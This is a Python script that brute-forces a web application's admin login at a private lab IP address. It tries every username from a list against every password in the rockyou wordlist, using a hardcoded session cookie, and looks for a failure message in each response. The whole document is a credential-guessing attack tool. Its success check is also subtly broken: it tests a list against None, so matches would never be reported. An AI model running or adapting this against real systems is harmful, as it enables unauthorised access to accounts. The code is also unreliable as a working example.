#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import requests
import codecs
from bs4 import BeautifulSoup

url = "http://192.168.216.132:80/index.php?system=Admin&page=loginSubmit"

headers = {
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": "http://192.168.216.132/index.php?system=Admin&page=loginSubmit",
        "Cookie": "PHPSESSID=7332fc7253602e3b090793070c1de933",
        "Content-Type": "application/x-www-form-urlencoded",
        }

data = {
        "username": "root",
        "password": "1",
        }

fNamePassword = "/tmp/rockyou.txt"
#consider to load username list into memory
fNameUsername = "/tmp/users.txt"

with open(fNamePassword, encoding="latin-1") as fpass, open(fNameUsername, encoding="utf-8") as fuser:
    usernames = fuser.readlines()
    passwords = fpass.readlines()
    for u in usernames:
        for p in passwords:
            data["username"] = u.rstrip()
            data["password"] = p.rstrip()
            r = requests.post(url, headers=headers, data=data)
            soup = BeautifulSoup(r.text, "lxml")
            g = soup.body.find_all(text="Incorrect username or password.")
            if g is None:
                print (g)
                print ("{0}:{1}".format(u.rstrip(), p.rstrip()))
